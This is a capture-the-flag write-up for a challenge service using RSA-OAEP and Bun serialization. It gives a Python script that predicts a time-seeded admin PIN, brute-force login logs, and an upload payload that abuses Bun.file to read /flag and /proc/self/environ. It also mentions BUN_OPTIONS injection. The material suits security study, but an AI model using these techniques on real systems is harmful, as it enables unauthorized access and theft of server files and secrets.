# Secure Communication (Advanced) - CTF Writeup

## Challenge Overview

- **Challenge Name:** Secure Communication (Advanced)
- **Target:** `chal.polyuctf.com:35251` (This is the port number I will reference throughout the writeup, this can be replaced with the actual port) 
- **Category:** Binary Exploitation

This challenge presented a custom TCP-based protocol using RSA-OAEP encryption and Bun serialization. The service featured multiple command handlers including authentication, file upload, and an update mechanism.

## Initial Reconnaissance

### Protocol Analysis

Upon connecting to the service, the following handshake sequence was observed:

1. Server sends: `My Public Key: <base64 DER-SPKI RSA pubkey>` followed by `Your Public Key: `
2. Client must send its RSA public key as base64-encoded DER SPKI format
3. Server responds: `Public Key imported successfully.`
4. All subsequent commands are encrypted using RSA-OAEP-SHA512

### Command Structure

Commands follow this format:
- **Client to Server:** `base64(RSA-OAEP-SHA512(server_pub, base64(Bun.serialize(object))))`
- **Server to Client:** `base64(RSA-OAEP-SHA512(client_pub, utf8_string))`

Supported commands: `register`, `login`, `ping`, `reset`, `start`, `upload`, `update`, `exit`

### Process Freshness Verification

Multiple connections revealed that the server public key changes with each connection, confirming a fresh process-per-connection model:

```
Connection 1: MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvQvaxYySQm+5154WmrjXcdZ42+bchyTXCkbxdiudVuVtHK87c7uI8RO9+AwTR9I9Rr1/vDcbGvJLH9FsWzg+vdJB++ZNDSlBa0RHXwgb6q3xxOW4kXsg674syMZM1lF+Jtg8SyKssTaF6VQ0cBQMF8JwMYiHgHpwu88GsLhXcC7CglCDaRPlgE6VMnv8woeYxwm1TfMNCahV7fRpzeYgJ9dT86Oi5VKOyqovgDVp9AoCJPptx0kX911RC9wSxXXCco6XXjiCEIRhK55r5hfZZIjyNk1xDdP0C/zOx5cUfmapzaAERkvdttwpF4P1r0wBGG70zJAvs2T1v6JBQRW9YqYKX9RuOBe5tjMM4vNAphFqxNT9T9Kq/8gAj9/qtv9p5wdUIzFGxW062CDiHKvrsL0YjYWVNInJA12t3VpKxbKTu1MGh5LZDoTdghOh5ueSzE9Y18lc/WPmczPKPfPzzl2ST3vPwI2QTNHclqZCBV/U+XgCkW2XBFLCC52AKk8cKDwi2WOmUP8rR2S6anrwxvbETfFZsbmbXkMZAL9p77joaDD1PkJ6ERVScoyD6tyOhWjISBR5Z00QfgUx8SFJHZ2hCxJys1tTyeB3N/YQ7DHebYtJaeosdVlpwf/kJ00Ll14zZuCz//w5BEAS4Kl5TYW88V4yVUeRVlhcL4KosuUCAwEAAQ==

Connection 2: MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0Ot9hpuFEBntD2Dr6j+1EspNdF7k2DdwLV2gUGQTFzBrpvYMfUZJvrWdS+TElMnPMQXrvoyDgyCaXaIyoqxleph8Z2QY57ys+xDD+/yNvpy/b4qfosoHN3cVsjPpqsQBbPi5vvzAkuTJ5YPpcPWriE4UudtvAi3MVtrqslrOblR3cn/3tiFM+xvtAtq3DOfQvCpciTQ9o9UQTqjf4HVE3OEwHwIsw05mcLLdvS9JnuirrPY6oA6i0dLOXgepdA1M5vClSbEFRR+0f2uwR48GHng4Ebr84x7FTrGXJKwmoUow7O/ab8+Bcoba4xuICYNgS1MhQSfkTQoFNcnEJHRnBgcpTzpXScpr0/IiU4jum8YPX6SEOx/VbK/xvT+fZU71MvZXrnfYSUPWx5VdNBOPOXdZUVOAdZa2VtiSviiB7d8TF0YmkbBfSaSEwaEecTr/cYb9hy9kQbRvwkNTxQB4IM0AD+d3mylmBLFocdwze/c+xMMzMQH1S6z6mnAFEyP3ESACNzJbaw4a6cycuNTTPeZ6YM4VxaYp5NWdJ+NGsPNdIyK8IvXtqShULRQmH0IjlSmWjtnmuww/zu8g9DhV0nqAZm/1t/mpLuyPKpf0kbfRhCh5S3m1rJrspqQsH6uGWtAywhpRdt4XMM/kN5tuRYgGcm/sXGHQYxz6rouZbekCAwEAAQ==

[... 3 more unique keys ...]

Result: unique=5/5
```

## Vulnerability 1: Predictable Admin PIN

### PIN Generation Analysis

The admin account PIN is seeded at startup using the following algorithm:

```javascript
b = Date.now();
b -= b % 5000;  // Round to nearest 5000ms bucket
pin = BigInt(b) ** 2n;  // Square the bucket
```

This creates a predictable PIN based on the server's startup time. Since the process is fresh per connection, the PIN changes each time but follows a predictable pattern based on the current time.

### PIN Calculation Strategy

The PIN formula: `pin = (floor(Date.now() / 5000) * 5000)²`

Key observations:
- The PIN is truncated to 64 bits: `pin & ((1n << 64n) - 1n)`
- SQLite stores this as a signed 64-bit integer
- JavaScript may interpret large integers as floats, causing precision loss

We implemented multiple PIN format variants:
- Unsigned 64-bit string
- Signed 64-bit string (for SQLite INTEGER readback)
- Scientific notation (JavaScript float representation)

### Exploitation Script

```python
def admin_pin_candidates(now_ms=None, span_buckets=3):
    if now_ms is None:
        now_ms = int(time.time() * 1000)
    bucket = (now_ms // 5000) * 5000
    mask = (1 << 64) - 1
    out = []
    for off in range(-span_buckets, span_buckets + 1):
        b = bucket + off * 5000
        pin = (b * b) & mask
        # Handle signed/unsigned conversion
        if pin >= 1 << 63:
            signed = pin - (1 << 64)
        else:
            signed = pin
        out.append((b, str(pin), str(signed)))
    return out
```

### Successful Admin Login

Using the same connection for timing estimation and brute-forcing:

```
>>> {"command":"login","username":"admin","pin":"5450944067092746240"}
Login failed. Invalid credentials.
[... 15 attempts ...]
>>> {"command":"login","username":"admin","pin":"5770153591192746240"}
Login successful. Welcome, admin!
PIN=5770153591192746240
```

The successful PIN matched the formula: `bucket = 7595000, pin = 7595000² = 5770153591192746240`

## Vulnerability 2: Arbitrary File Read via Upload

### Upload Handler Analysis

The `upload` command accepts an array of file objects with the structure:

```javascript
{
  command: "upload",
  files: [{
    name: "filename",
    content: {
      type: "text/html",
      content: Bun.file("/path/to/read")
    }
  }]
}
```

Key vulnerabilities:
1. **Bun.file serialization:** `Bun.file(path)` survives `bun:jsc` serialization as a lazy path-backed Blob
2. **Server-side write:** The server performs `await Bun.write('/tmp/${name}', await i.content)`
3. **HTTP exposure:** The `start` command launches a static server on `/tmp/`

### Attack Chain

1. **Login as admin** (using predictable PIN)
2. **Upload payload** with `Bun.file("/flag")` as content
3. **Start HTTP server** to expose `/tmp/`
4. **Fetch the uploaded file** to read arbitrary server files

### Payload Construction

```javascript
{
  "command": "upload",
  "files": [
    {
      "name": "f1html",
      "content": {
        "type": "text/html",
        "content": {
          "__bunfile__": "/flag"  // Custom serialization marker
        }
      }
    }
  ]
}
```

### Reconnaissance Uploads

Before targeting the flag, we verified the primitive with system files:

**Command line leak:**
```
Payload: Bun.file("/proc/self/cmdline")
Result: /usr/libexec/qemu-binfmt/aarch64-binfmt-P/chal/chal
```

**Environment leak:**
```
Payload: Bun.file("/proc/self/environ")
Result: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=41230eebb0ceHOME=/rootREMOTE_HOST=172.17.0.51
```

## Exploitation: Reading the Flag

### Step 1: Admin Authentication

```
My Public Key: MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsbSlurTQDE5vH4Vt8pPXTsi0EFNYo0145sXoR6NspWdYKNBE+L8Q6rUJliZtd73qRLgWrvnFy4JlCG0MSvwRYMMQJWoFmZe5PU01PPtuTtG2O9l6obdNX2kAURtHjlf0WY7DNY0kdUkThIK5uKSEOKPfr0+Lro7IVMqNjaC3HIFhTI6LLckb4ua4dCH/br/cOk7IY9gnT0S11r8r0cM/KE+N3ITtQ5xwlTxKRmAVpLgeo5ObfiqJCU2dSjOpY7LY0so5Bhg6z8iBvCMVlzR2tp1VqHBILXrVyilB70ND/360l88xZU4xyeZusJs6ReZA7yhDsZkPVQbfA1ZjosS2QEP/gRsRxIy1t/0ZYjTLyhjoLywmwPzw2MgKRMbl95goYJo0mO4puZIBFHv6c5Iqgs68hPeOjMhz8MarWcr9nR5M0DponTxEbNUfoTHjWiFAkde6frxz7cQxrJUQw90cUPUW3UzyY2p+IgioXY1Gz9d00t+3rjVjF6YVb53rvujB8GULalC9QJNAVN25/X5Qmt/c2xHPlY/eMjlGm67PHKvLtR5wVT5rHHs6FPdn+thc/b/bBhU0zteIMcBZTjiLPPQh9sJV/ewRdMIVPPTIN1iMIA+mhfqmS8oXn0q1OZ2ylLxdSLeCqRmhtbwNcV3FIsG0frAgNJfJMQMAepm2wXkCAwEAAQ==
Your Public Key: Public Key imported successfully.

>>> {"command":"login","username":"admin","pin":"8820378749592746240"}
Login successful. Welcome, admin!
PIN=8820378749592746240
```

### Step 2: Upload Flag Payload

```
>>> {"command":"upload","files":[{"name":"f1html","content":{"type":"text/html","content":{"__bunfile__":"/flag"}}}]}
Received message: {command:'upload',files:[{name:'f1html',content:{type:'text/html',content:{}}}]}
```

### Step 3: Start HTTP Server

```
>>> {"command":"start"}
File uploaded: f1html
```

### Step 4: Fetch the Flag

HTTP Request:
```http
GET /f1html HTTP/1.1
Host: chal.polyuctf.com:35251
Connection: close

```

HTTP Response:
```http
HTTP/1.1 200 OK
content-type: application/octet-stream
content-disposition: filename="f1html"
content-length: 59
Date: Fri, 13 Mar 2026 07:32:40 GMT

PUCTF26{t8p_h77p_t0g5t2e9_3kh6xYNlHXC21hPHHt2R80pbJXKZBE6X}
```

## Alternative Paths Attempted

### Update Path (Not Required)

The `update` command spawns a child process with attacker-controlled environment:

```javascript
Bun.spawnSync({ 
  cmd: [process.execPath, 'update'], 
  env: e.env || process.env 
})
```

Potential vectors explored:
- `BUN_OPTIONS` for command injection (confirmed working locally)
- `HTTPS_PROXY` / `HTTP_PROXY` for traffic redirection
- `NODE_TLS_REJECT_UNAUTHORIZED=0` for TLS bypass

While this path showed promise, the file upload vulnerability provided direct flag access.

### Path Variations Tested

Multiple flag locations were attempted:
- `/flag` ✅ (success)
- `/flag.txt` ❌ (not found)
- `/chal/flag` ❌ (not found)
- `/chal/flag.txt` ❌ (not found)

## Tools and Scripts

### Protocol Client (`client.py`)

Key features:
- RSA key generation and DER SPKI encoding
- RSA-OAEP-SHA512 encryption/decryption
- Bun serialization via `bun:jsc` helper script
- Admin PIN brute-forcing with timing synchronization
- Session management for multi-command sequences

### Serialization Helper (`bun_serialize.js`)

Custom Bun serialization supporting:
- Standard objects
- `Bun.file()` paths (via `__bunfile__` marker)
- `Blob` and `File` objects
- Uint8Array binary data

## Conclusion

This challenge demonstrated a multi-stage exploitation chain:

1. **Cryptographic Protocol:** Custom RSA+OAEP+Serialization required building a compatible client
2. **Logic Flaw:** Predictable PIN generation based on system time
3. **Type Confusion:** Bun.file objects surviving serialization as readable file handles
4. **Path Traversal:** Upload handler allowing arbitrary file reads from the server filesystem

**Flag:** `PUCTF26{t8p_h77p_t0g5t2e9_3kh6xYNlHXC21hPHHt2R80pbJXKZBE6X}`

## Lessons Learned

1. **Time-based seeds** in multi-tenant environments can be predictable when processes are ephemeral
2. **Serialization boundaries** don't always sanitize complex objects (Bun.file maintains path references)
3. **Lazy evaluation** in file objects can lead to server-side request forgery (SSRF) style vulnerabilities
4. **Defense in depth:** File upload handlers should validate content, not just metadata
